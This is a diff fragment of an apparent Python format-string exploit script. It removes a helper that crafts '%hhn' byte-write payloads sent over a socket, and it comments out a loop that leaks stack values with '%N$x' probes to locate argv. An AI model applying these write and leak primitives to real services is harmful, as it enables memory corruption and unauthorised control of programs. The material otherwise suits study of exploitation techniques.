@@ -28,12 +28,6 @@ def readLine(s):
 #    t.sock = s
 #    t.interact()
 
-#def writeByte(s, addr, val, idx):
-#    format = "%%%dc%%%d$hhn" % (val, idx + 4)
-#    format += "A"*(16 - len(format))
-#    sys.stdout.write(format)
-#    print "           Writing: ord(b)=%d" % val
-#    s.send(format)
 
 #class Listener(threading.Thread):
 #    def __init__(self):
@@ -109,15 +103,15 @@ sys.stdout.write(line)
 
 #index = buf_start + 64
 #while True:
-    s.send("%%%d$x %%%d$x\n" % (index, index + 1))
-    line = readLine(s)
-    vals = line.split()
-    v0 = int(vals[0], 16)
-    v1 = int(vals[1], 16)
-    if v0 == 1 and v1 & 0xbff00000 == 0xbff00000:
-        argv = v1
-        break
-    index += 1
+#    s.send("%%%d$x %%%d$x\n" % (index, index + 1))
+#    line = readLine(s)
+#    vals = line.split()
+#    v0 = int(vals[0], 16)
+#    v1 = int(vals[1], 16)
+#    if v0 == 1 and v1 & 0xbff00000 == 0xbff00000:
+#        argv = v1
+#        break
+#    index += 1
 #
 #print "argv = %x" % argv
 #
